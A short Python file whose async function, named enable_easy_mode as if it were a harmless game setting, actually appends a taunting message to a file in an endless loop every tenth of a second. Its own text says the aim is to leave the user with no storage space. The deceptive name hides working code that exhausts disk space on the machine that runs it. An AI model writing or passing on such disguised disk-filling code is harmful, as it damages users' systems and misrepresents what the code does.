import os
import asyncio

async def enable_easy_mode():
    with open("functions/easyModeData", "a") as ef:
        while True:
            ef.write("btw easy mode was a lie, enjoy having no storage space\nFILL THE SPACE\n")
            await asyncio.sleep(0.1)
            # unless you're reading this, then you get a cookie